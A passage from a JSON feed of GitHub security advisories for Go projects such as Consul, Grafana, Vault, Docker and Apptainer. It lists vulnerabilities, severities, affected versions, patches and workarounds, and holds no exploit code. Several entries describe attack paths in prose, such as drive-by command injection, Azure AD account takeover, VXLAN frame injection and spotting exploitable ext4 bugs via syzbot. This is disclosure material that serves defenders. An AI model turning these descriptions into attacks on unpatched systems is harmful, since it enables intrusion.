"github_reviewed": true, "github_reviewed_at": "2023-06-21T22:08:34Z", "nvd_published_at": "2023-06-26T20:15:10Z"}}, {"schema_version": "1.4.0", "id": "GHSA-c57c-7hrj-6q6v", "modified": "2023-06-06T02:05:01Z", "published": "2023-06-03T00:30:16Z", "aliases": ["CVE-2023-1297"], "summary": "Hashicorp Consul vulnerable to denial of service", "details": "Consul and Consul Enterprise's cluster peering implementation contained a flaw whereby a peer cluster with service of the same name as a local service could corrupt Consul state, resulting in denial of service. This vulnerability was resolved in Consul 1.14.5, and 1.15.3", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hashicorp/consul"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.14.5"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/consul"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.15.0"}, {"fixed": "1.15.3"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-1297"}, {"type": "WEB", "url": "https://discuss.hashicorp.com/t/hcsec-2023-15-consul-cluster-peering-can-result-in-denial-of-service/54515"}, {"type": "PACKAGE", "url": "https://github.com/hashicorp/consul"}], "database_specific": {"cwe_ids": ["CWE-826"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-06-06T02:05:01Z", "nvd_published_at": "2023-06-02T23:15:09Z"}}, {"schema_version": "1.4.0", "id": "GHSA-9m3v-v4r5-ppx7", "modified": "2023-06-16T17:54:18Z", "published": "2023-06-06T16:43:01Z", "aliases": ["CVE-2023-33957"], "summary": "Notation vulnerable to denial of service from high number of artifact signatures", "details": "### Impact\nAn attacker who controls or compromises a registry can make the registry serve an infinite number of signatures for the artifact, causing a denial of service to the host machine running `notation verify`.\n\n### Patches\nThe problem has been fixed in the release [v1.0.0-rc.6](https://github.com/notaryproject/notation/releases/tag/v1.0.0-rc.6). Users should upgrade their notation packages to [v1.0.0-rc.6](https://github.com/notaryproject/notation/releases/tag/v1.0.0-rc.6) or above.\n\n### Workarounds\nUser should use secure and trusted container registries.\n\n### Credits\nThe `notation` project would like to thank Adam Korczynski (@AdamKorcz) for responsibly disclosing the issue found during an security audit (facilitated by OSTIF and sponsored by CNCF) and Shiwei Zhang (@shizhMSFT) for root cause analysis.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/notaryproject/notation"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.0.0-rc.6"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/notaryproject/notation/security/advisories/GHSA-9m3v-v4r5-ppx7"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-33957"}, {"type": "WEB", "url": "https://github.com/notaryproject/notation/commit/ed22fde52f6d70ae0b53521bd28c9ccafa868c24"}, {"type": "PACKAGE", "url": "https://github.com/notaryproject/notation"}, {"type": "WEB", "url": "https://github.com/notaryproject/notation/releases/tag/v1.0.0-rc.6"}], "database_specific": {"cwe_ids": ["CWE-400"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-06-06T16:43:01Z", "nvd_published_at": "2023-06-06T19:15:12Z"}}, {"schema_version": "1.4.0", "id": "GHSA-vfrj-fv6p-3cpf", "modified": "2023-06-06T01:38:11Z", "published": "2023-06-06T01:38:11Z", "aliases": ["CVE-2023-33965"], "summary": "Brook's tproxy server is vulnerable to a drive-by command injection.", "details": "The `tproxy` server is vulnerable to a drive-by command injection. An attacker may fool a victim into visiting a malicious web page which will trigger requests to the local `tproxy` service leading to remote code execution.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/txthinking/brook"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "20230606"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/txthinking/brook/security/advisories/GHSA-vfrj-fv6p-3cpf"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-33965"}, {"type": "WEB", "url": "https://github.com/txthinking/brook/commit/314d7070c37babf6c38a0fe1eada872bb74bf03e"}, {"type": "PACKAGE", "url": "https://github.com/txthinking/brook"}], "database_specific": {"cwe_ids": ["CWE-78"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2023-06-06T01:38:11Z", "nvd_published_at": "2023-06-01T15:15:09Z"}}, {"schema_version": "1.4.0", "id": "GHSA-m54h-5x5f-5m6r", "modified": "2023-06-30T20:25:41Z", "published": "2023-06-28T22:48:50Z", "aliases": ["CVE-2023-35930"], "summary": "SpiceDB's LookupResources may return partial results", "details": "### Impact\nAny user making a negative authorization decision based on the results of a LookupResources request with 1.22.0 is affected.\n\nFor example, using `LookupResources` to find a list of resources to allow access to be okay: some subjects that should have access to a resource may not. But if using `LookupResources` to find a list of banned resources instead, then some users that shouldn't have access may.\n\nGenerally, `LookupResources` is not and should not be used to gate access in this way - that's what the `Check` API is for. Additionally, version 1.22.0 has included a warning about this bug since its initial release.\n\n### Workarounds\nAvoid using `LookupResources` for negative authorization decisions if using `1.22.0`. \n\n### Patches\nThe only affected release is [v1.22.0](https://github.com/authzed/spicedb/releases/tag/v1.22.0), and it is patched in [v1.22.2](https://github.com/authzed/spicedb/releases/tag/v1.22.2) (there is no v1.22.1 release, though there is a git tag).\n\n### References\n- https://github.com/authzed/spicedb/pull/1397\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [SpiceDB](https://github.com/authzed/spicedb)\n* Ask a question in the [SpiceDB Discord](https://authzed.com/discord)\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/authzed/spicedb"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.22.0"}, {"fixed": "1.22.2"}]}], "versions": ["1.22.0"]}], "references": [{"type": "WEB", "url": "https://github.com/authzed/spicedb/security/advisories/GHSA-m54h-5x5f-5m6r"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-35930"}, {"type": "WEB", "url": "https://github.com/authzed/spicedb/pull/1397"}, {"type": "PACKAGE", "url": "https://github.com/authzed/spicedb"}, {"type": "WEB", "url": "https://github.com/authzed/spicedb/releases/tag/v1.22.2"}], "database_specific": {"cwe_ids": ["CWE-913"], "severity": "LOW", "github_reviewed": true, "github_reviewed_at": "2023-06-28T22:48:50Z", "nvd_published_at": "2023-06-26T20:15:10Z"}}, {"schema_version": "1.4.0", "id": "GHSA-mpv3-g8m3-3fjc", "modified": "2023-06-23T21:38:39Z", "published": "2023-06-22T21:30:49Z", "aliases": ["CVE-2023-3128"], "summary": "Grafana vulnerable to Authentication Bypass by Spoofing", "details": "Grafana is validating Azure AD accounts based on the email claim. \n\nOn Azure AD, the profile email field is not unique and can be easily modified. \n\nThis leads to account takeover and authentication bypass when Azure AD OAuth is configured with a multi-tenant app. \n\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/grafana/grafana"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "9.4.0"}, {"fixed": "9.4.13"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/grafana/grafana"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "9.3.0"}, {"fixed": "9.3.16"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/grafana/grafana"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "9.0.0"}, {"fixed": "9.2.20"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/grafana/grafana"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "8.5.27"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/grafana/bugbounty/security/advisories/GHSA-gxh2-6vvc-rrgp"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-3128"}, {"type": "PACKAGE", "url": "https://github.com/grafana/grafana"}, {"type": "WEB", "url": "https://github.com/grafana/grafana/blob/69fc4e6bc0be2a82085ab3885c2262a4d49e97d8/CHANGELOG.md"}, {"type": "WEB", "url": "https://grafana.com/security/security-advisories/cve-2023-3128/"}, {"type": "WEB", "url": "https://security.netapp.com/advisory/ntap-20230714-0004/"}], "database_specific": {"cwe_ids": ["CWE-290"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2023-06-23T21:38:39Z", "nvd_published_at": "2023-06-22T21:15:09Z"}}, {"schema_version": "1.4.0", "id": "GHSA-hh54-53m7-7ffj", "modified": "2023-06-13T23:57:23Z", "published": "2023-06-07T15:30:17Z", "aliases": ["CVE-2023-33498"], "summary": "alist Incorrect Access Control vulnerability", "details": "alist <=3.16.3 is vulnerable to Incorrect Access Control. Low privilege accounts can upload any file.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/alist-org/alist/v3"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "3.16.3"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-33498"}, {"type": "WEB", "url": "https://github.com/YUyuanAN-com/loophole"}, {"type": "PACKAGE", "url": "https://github.com/alist-org/alist"}], "database_specific": {"cwe_ids": ["CWE-434"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-06-08T18:05:49Z", "nvd_published_at": "2023-06-07T14:15:09Z"}}, {"schema_version": "1.4.0", "id": "GHSA-rqjq-ww83-wv5c", "modified": "2023-06-06T02:04:22Z", "published": "2023-06-03T00:30:16Z", "aliases": ["CVE-2023-2816"], "summary": "Hashicorp Consul allows user with service:write permissions to patch remote proxy instances", "details": "Consul and Consul Enterprise allowed any user with service:write permissions to use Envoy extensions configured via service-defaults to patch remote proxy instances that target the configured service, regardless of whether the user has permission to modify the service(s) corresponding to those modified proxies.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hashicorp/consul"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.15.0"}, {"fixed": "1.15.3"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-2816"}, {"type": "WEB", "url": "https://discuss.hashicorp.com/t/hcsec-2023-16-consul-envoy-extension-downstream-proxy-configuration-by-upstream-service-owner/54525"}, {"type": "PACKAGE", "url": "https://github.com/hashicorp/consul"}], "database_specific": {"cwe_ids": [], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-06-06T02:04:22Z", "nvd_published_at": "2023-06-02T23:15:09Z"}}, {"schema_version": "1.4.0", "id": "GHSA-74j8-w7f9-pp62", "modified": "2023-06-30T20:25:52Z", "published": "2023-06-30T20:25:52Z", "aliases": ["CVE-2023-33190"], "summary": "Improper configuration of RBAC permissions obtaining cluster control permissions", "details": "### Summary\nImproper configuration of RBAC permissions resulted in obtaining cluster control permissions, which could control the entire cluster deployed with Sealos, as well as hundreds of pods and other resources within the cluster.\n\n### Details\ndetail's is disable by publish.\n\n### PoC\ndetail's is disable by publish.\n\n### Impact\n+ sealos public cloud user\n+ CWE-287 Improper Authentication\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/labring/sealos"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "4.2.1-rc4"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/labring/sealos/security/advisories/GHSA-74j8-w7f9-pp62"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-33190"}, {"type": "WEB", "url": "https://github.com/labring/sealos/commit/4cdf52e55666864e5f90ed502e9fc13e18985b7b"}, {"type": "PACKAGE", "url": "https://github.com/labring/sealos"}], "database_specific": {"cwe_ids": ["CWE-287", "CWE-863"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2023-06-30T20:25:52Z", "nvd_published_at": "2023-06-29T19:15:08Z"}}, {"schema_version": "1.4.0", "id": "GHSA-gq98-53rq-qr5h", "modified": "2023-06-09T22:40:33Z", "published": "2023-06-09T18:30:34Z", "aliases": ["CVE-2023-2121"], "summary": "Hashicorp Vault vulnerable to Cross-site Scripting", "details": "Vault and Vault Enterprise's (Vault) key-value v2 (kv-v2) diff viewer allowed HTML injection into the Vault web UI through key values. This vulnerability, CVE-2023-2121, is fixed in Vault 1.14.0, 1.13.3, 1.12.7, and 1.11.11.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hashicorp/vault"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.11.11"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/vault"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.12.0"}, {"fixed": "1.12.7"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/vault"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.13.0"}, {"fixed": "1.13.3"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-2121"}, {"type": "WEB", "url": "https://discuss.hashicorp.com/t/hcsec-2023-17-vault-s-kv-diff-viewer-allowed-html-injection/54814"}, {"type": "PACKAGE", "url": "https://github.com/hashicorp/vault"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-06-09T22:40:33Z", "nvd_published_at": "2023-06-09T17:15:09Z"}}, {"schema_version": "1.4.0", "id": "GHSA-6wrf-mxfj-pf5p", "modified": "2023-04-05T23:15:38Z", "published": "2023-04-04T21:11:24Z", "aliases": ["CVE-2023-28842"], "summary": "Docker Swarm encrypted overlay network with a single endpoint is unauthenticated", "details": "[Moby](https://mobyproject.org/) is an open source container framework developed by Docker Inc. that is distributed as Docker, Mirantis Container Runtime, and various other downstream projects/products. The Moby daemon component (`dockerd`), which is developed as [moby/moby](https://github.com/moby/moby) is commonly referred to as *Docker*.\n\nSwarm Mode, which is compiled in and delivered by default in `dockerd` and is thus present in most major Moby downstreams, is a simple, built-in container orchestrator that is implemented through a combination of [SwarmKit](https://github.com/moby/swarmkit) and supporting network code.\n\nThe `overlay` network driver is a core feature of Swarm Mode, providing isolated virtual LANs that allow communication between containers and services across the cluster. This driver is an implementation/user of [VXLAN](https://en.wikipedia.org/wiki/Virtual_Extensible_LAN), which encapsulates link-layer (Ethernet) frames in UDP datagrams that tag the frame with a VXLAN Network ID (VNI) that identifies the originating overlay network. In addition, the overlay network driver supports an optional, off-by-default encrypted mode, which is especially useful when VXLAN packets traverses an untrusted network between nodes.\n\nEncrypted overlay networks function by encapsulating the VXLAN datagrams through the use of the [IPsec Encapsulating Security Payload](https://en.wikipedia.org/wiki/IPsec#Encapsulating_Security_Payload) protocol in [Transport mode](https://en.wikipedia.org/wiki/IPsec#Transport_mode). By deploying IPSec encapsulation, encrypted overlay networks gain the additional properties of source authentication through cryptographic proof, data integrity through check-summing, and confidentiality through encryption.\n\nWhen setting an endpoint up on an encrypted overlay network, Moby installs three [iptables](https://www.netfilter.org/projects/iptables/index.html) (Linux kernel firewall) rules that enforce both incoming and outgoing IPSec. These rules rely on the `u32` iptables extension provided by the `xt_u32` kernel module to directly filter on a VXLAN packet's VNI field, so that IPSec guarantees can be enforced on encrypted overlay networks without interfering with other overlay networks or other users of VXLAN.\n\nThe `overlay` driver dynamically and lazily defines the kernel configuration for the VXLAN network on each node as containers are attached and detached. Routes and encryption parameters are only defined for destination nodes that participate in the network. The iptables rules that prevent encrypted overlay networks from accepting unencrypted packets are not created until a peer is available with which to communicate.\n\n## Impact\nEncrypted overlay networks silently accept cleartext VXLAN datagrams that are tagged with the VNI of an encrypted overlay network. As a result, it is possible to inject arbitrary Ethernet frames into the encrypted overlay network by encapsulating them in VXLAN datagrams. The implications of this can be quite dire, and [GHSA-vwm3-crmr-xfxw](https://github.com/moby/moby/security/advisories/GHSA-vwm3-crmr-xfxw) should be referenced for a deeper exploration.\n\n## Patches\nPatches are available in Moby releases 23.0.3, and 20.10.24. As Mirantis Container Runtime's 20.10 releases are numbered differently, users of that platform should update to 20.10.16.\n\n## Workarounds\n* In multi-node clusters, deploy a global \u2018pause\u2019 container for each encrypted overlay network, on every node. For example, use the `registry.k8s.io/pause` image and a `--mode global` service.\n* For a single-node cluster, do not use overlay networks of any sort. Bridge networks provide the same connectivity on a single node and have no multi-node features.\nThe Swarm ingress feature is implemented using an overlay network, but can be disabled by publishing ports in `host` mode instead of `ingress` mode (allowing the use of an external load balancer), and removing the `ingress` network.\n* If encrypted overlay networks are in exclusive use, block UDP port 4789 from traffic that has not been validated by IPSec. For example, `iptables -A INPUT -m udp \u2014-dport 4789 -m policy --dir in --pol none -j DROP`.\n\n## Background\n* This issue was discovered while characterizing and mitigating [CVE-2023-28840](https://github.com/moby/moby/security/advisories/GHSA-232p-vwff-86mp) and [CVE-2023-28841](https://github.com/moby/moby/security/advisories/GHSA-33pg-m6jh-5237).\n\n## Related\n* [CVE-2023-28841: Encrypted overlay network traffic may be unencrypted](https://github.com/moby/moby/security/advisories/GHSA-33pg-m6jh-5237)\n* [CVE-2023-28840: Encrypted overlay network may be unauthenticated](https://github.com/moby/moby/security/advisories/GHSA-232p-vwff-86mp)\n* [GHSA-vwm3-crmr-xfxw: The Swarm VXLAN port may be exposed to attack due to ambiguous documentation](https://github.com/moby/moby/security/advisories/GHSA-vwm3-crmr-xfxw)\n* [GHSA-gvm4-2qqg-m333: Security issues in encrypted overlay networks](https://github.com/moby/libnetwork/security/advisories/GHSA-gvm4-2qqg-m333) (libnetwork)", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/docker/docker"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.12.0"}, {"fixed": "20.10.24"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/docker/docker"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "23.0.0"}, {"fixed": "23.0.3"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/moby/libnetwork/security/advisories/GHSA-gvm4-2qqg-m333"}, {"type": "WEB", "url": "https://github.com/moby/moby/security/advisories/GHSA-232p-vwff-86mp"}, {"type": "WEB", "url": "https://github.com/moby/moby/security/advisories/GHSA-33pg-m6jh-5237"}, {"type": "WEB", "url": "https://github.com/moby/moby/security/advisories/GHSA-6wrf-mxfj-pf5p"}, {"type": "WEB", "url": "https://github.com/moby/moby/security/advisories/GHSA-vwm3-crmr-xfxw"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-28842"}, {"type": "PACKAGE", "url": "https://github.com/moby/moby"}], "database_specific": {"cwe_ids": ["CWE-420", "CWE-636"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-04-04T21:11:24Z", "nvd_published_at": "2023-04-04T22:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-xq3x-grrj-fj6x", "modified": "2023-04-07T22:24:59Z", "published": "2023-04-02T12:30:16Z", "aliases": ["CVE-2023-1800"], "summary": "sjqzhang go-fastdfs vulnerable to path traversal", "details": "sjqzhang go-fastdfs up to 1.4.3 is vulnerable to path traversal in the function upload of the file `/group1/upload` of the component `File Upload Handler`. The attack may be launched remotely and the exploit has been disclosed to the public and may be used.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/sjqzhang/go-fastdfs"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.4.5-0.20230408141131-61cbff5124c6"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-1800"}, {"type": "WEB", "url": "https://github.com/sjqzhang/go-fastdfs/commit/61cbff5124c61e292994099372b11c06cdb5b80b"}, {"type": "ADVISORY", "url": "https://github.com/advisories/GHSA-xq3x-grrj-fj6x"}, {"type": "PACKAGE", "url": "https://github.com/sjqzhang/go-fastdfs"}, {"type": "WEB", "url": "https://github.com/yangyanglo/ForCVE/blob/93a16663cd32a36d37d8a0f0102e1592254d0279/2023-0x05.md"}, {"type": "WEB", "url": "https://github.com/yangyanglo/ForCVE/blob/main/2023-0x05.md"}, {"type": "WEB", "url": "https://vuldb.com/?ctiid.224768"}, {"type": "WEB", "url": "https://vuldb.com/?id.224768"}], "database_specific": {"cwe_ids": ["CWE-22"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2023-04-07T22:24:59Z", "nvd_published_at": "2023-04-02T11:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-j4rf-7357-f4cg", "modified": "2023-07-07T23:16:31Z", "published": "2023-04-25T19:48:35Z", "aliases": ["CVE-2023-30549"], "summary": "Unpatched extfs vulnerabilities are exploitable through suid-mode Apptainer", "details": "### Impact\nThere is an ext4 use-after-free flaw described in CVE-2022-1184 that is exploitable through versions of Apptainer < 1.1.0 and installations that include apptainer-suid < 1.1.8 on older operating systems where that CVE has not been patched.  That includes Red Hat Enterprise Linux 7, Debian 10 buster (unless the linux-5.10 package is installed), Ubuntu 18.04 bionic and Ubuntu 20.04 focal.  Use-after-free flaws in the kernel can be used to attack the kernel for denial of service and potentially for privilege escalation.\n\n### Background\nHistorically there have been many CVEs published for extfs and a smaller number for squashfs, including serious use-after-free and buffer overrun vulnerabilities, that are scored as \"Moderate\" or \"Low\" impact only because unprivileged users were assumed to not have write access to the raw data.  Because of those ratings, vendors treat such CVEs as low urgency and either delay a patch until their next major release or never patch older but still supported operating systems at all.  Many Linux distributions automatically mount user-writable USB-drive volumes, but those are considered low risk because they require physical access to the machine.  However, since setuid-root installations of Apptainer by default allow all users to mount any extfs (specifically, ext3, which is implemented by the ext4 driver) and squashfs filesystem using kernel drivers even though the users have write access to the raw data, the setuid-root installations raise the severity of such unpatched CVEs.  \n\nCVE-2022-1184 is currently such an unpatched CVE, at least on the above listed operating systems.  The descriptions from the operating system vendors about the CVE (referenced below) are incomplete, saying only that it allows a local attacker with user privilege to cause a denial of service.  Normally users would not be able to cause it because they cannot modify the filesystem image, and normally vulnerabilities that involve kernel memory corruption by unprivileged users are considered high severity even when there is not yet a known privilege escalation because someone with sufficient kernel knowledge can usually turn such a corruption into a privilege escalation. \n\nRed Hat did not list RHEL7 as vulnerable, but they also did not list it as unaffected, and testing confirmed that a filesystem image could be corrupted to get past the check inserted into the filesystem driver to fix the vulnerability (patches linked below).\n\nAll published squashfs CVEs have been patched in currently supported major operating systems.\n\n### Patches\nApptainer 1.1.8 includes a patch that by default disables mounting of extfs filesystem types in setuid-root mode, while continuing to allow mounting of extfs filesystems in non-setuid \"rootless\" mode using fuse2fs.\n\n### Workarounds\nThese workarounds are possible:\n1. Either do not install apptainer-suid (for versions 1.1.0 through 1.1.7) or set `allow setuid = no` in apptainer.conf.  This requires having unprivileged user namespaces enabled and except for apptainer 1.1.x versions will disallow mounting of sif files, extfs files, and squashfs files in addition to other, less significant impacts.  (Encrypted sif files are also not supported unprivileged in apptainer 1.1.x.)\n2. Alternatively, use the `limit containers` options in apptainer.conf/singularity.conf to limit sif files to trusted users, groups, and/or paths.  (The option `allow container extfs = no` disallows mounting extfs overlay files but does not disallow mounting of extfs overlay partitions inside SIF files, so it does not help work around the problem.)\n\n### References\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-1184\nhttps://access.redhat.com/security/cve/cve-2022-1184\nhttps://security-tracker.debian.org/tracker/CVE-2022-1184\nhttps://ubuntu.com/security/CVE-2022-1184\nKernel patches for CVE-2022-1184:\nhttps://github.com/torvalds/linux/commit/65f8ea4cd57dbd46ea13b41dc8bac03176b04233\nhttps://github.com/torvalds/linux/commit/61a1d87a324ad5e3ed27c6699dfc93218fcf3201\n\n------\n\n## Addendum 30 May 2023\n\nNew information has become available: many ext4 filesytem vulnerabilities similar to the one in CVE-2022-1184 continue to be found, and most of them do not ever have a CVE assigned.  The way to locate them is to search for \"syzbot\" in linux kernel commit messages under fs/ext4.  \"syzbot\" is a public automated system for finding kernel bugs.  Especially when syzbot reports are labeled \"KASAN\" (Kernel Address Sanitizer) and especially if they involve memory corruption including \"use after free\", \"out of bounds\", or \"user-memory-access\", they are vulnerabilities that can potentially be turned into privilege escalation when an unprivileged user has write access to the underlying data.\n\nIn particular there are two such commits from this month, May 2023, referenced below.  They both have commit messages describing a situation of write access to the underlying data while the kernel has that data mounted as a filesystem.  These commits have been backported to currently maintained kernel lines in versions 4.19.293 and 5.4.243, but since they are considered moderate severity, most common OS distributions do not include them immediately.  For example since RHEL9.2 was recently announced, they are not likely to be available in RHEL9 until 9.3 is released in about another 6 months.  Therefore if system administrators want to be protected against these vulnerabilities while still allowing ext4 filesystem mounts through setuid-root apptainer, they should watch for these types of commits and whenever such commits are released the administrators should update to the latest currently maintained kernel version (bypassing their OS vendor's distribution) and reboot.\n\nhttps://github.com/torvalds/linux/commit/2220eaf90992c11d888fe771055d4de3303\nhttps://github.com/torvalds/linux/commit/4f04351888a83e595571de672e0a4a8b74f\nhttps://lwn.net/Articles/932137/\nhttps://lwn.net/Articles/932136/", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/apptainer/apptainer"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.1.8"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/apptainer/apptainer/security/advisories/GHSA-j4rf-7357-f4cg"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-1184"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-30549"}, {"type": "WEB", "url": "https://github.com/apptainer/apptainer/commit/5a4964f5ba9c8d89a0e353b97f51fd607670a9f7"}, {"type": "WEB", "url": "https://github.com/torvalds/linux/commit/2220eaf90992c11d888fe771055d4de3303"}, {"type": "WEB", "url": "https://github.com/torvalds/linux/commit/4f04351888a83e595571de672e0a4a8b74f"}, {"type": "WEB", "url": "https://github.com/torvalds/linux/commit/61a1d87a324ad5e3ed27c6699dfc93218fcf3201"}, {"type": "WEB", "url": "https://github.com/torvalds/linux/commit/65f8ea4cd57dbd46ea13b41dc8bac03176b04233"}, {"type": "WEB", "url": "https://access.redhat.com/security/cve/cve-2022-1184"}, {"type": "PACKAGE", "url": "https://github.com/apptainer/apptainer"}, {"type": "WEB", "url": "https://github.com/apptainer/apptainer/releases/tag/v1.1.8"}, {"type": "WEB", "url": "https://lwn.net/Articles/932136/"}, {"type": "WEB", "url": "https://lwn.net/Articles/932137/"}, {"type": "WEB", "url": "https://security-tracker.debian.org/tracker/CVE-2022-1184"}, {"type": "WEB", "url": "https://security.gentoo.org/glsa/202311-13"}, {"type": "WEB", "url": "https://sylabs.io/2023/04/response-to-cve-2023-30549/"}, {"type": "WEB", "url": "https://ubuntu.com/security/CVE-2022-1184"}, {"type": "WEB", "url": "https://www.suse.com/security/cve/CVE-2022-1184.html"}], "database_specific": {"cwe_ids": ["CWE-416"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-04-25T19:48:35Z", "nvd_published_at": "2023-04-25T21:15:10Z"}}, {"schema_version": "1.4.0", "id": "GHSA-9wh7-397j-722m", "modified": "2023-04-26T19:46:00Z", "published": "2023-04-26T19:46:00Z", "aliases": ["CVE-2023-30841"], "summary": "Ironic and ironic-inspector may expose as ConfigMaps", "details": "### Impact\nIronic and ironic-inspector deployed within Baremetal Operator using the included `deploy.sh` store their `.htpasswd` files as ConfigMaps instead of Secrets. This causes the plain-text username and hashed password to be readable by anyone having a cluster-wide read-access to the management cluster, or access to the management cluster's Etcd storage.\n\n### Patches\nThis issue is patched in [baremetal-operator PR#1241](https://github.com/metal3-io/baremetal-operator/pull/1241), and is included in BMO release 0.3.0 onwards.\n\n### Workarounds\nUser may modify the kustomizations and redeploy the BMO, or recreate the required ConfigMaps as Secrets per instructions in [baremetal-operator PR#1241](https://github.com/metal3-io/baremetal-operator/pull/1241)\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:C/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/metal3-io/baremetal-operator"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": 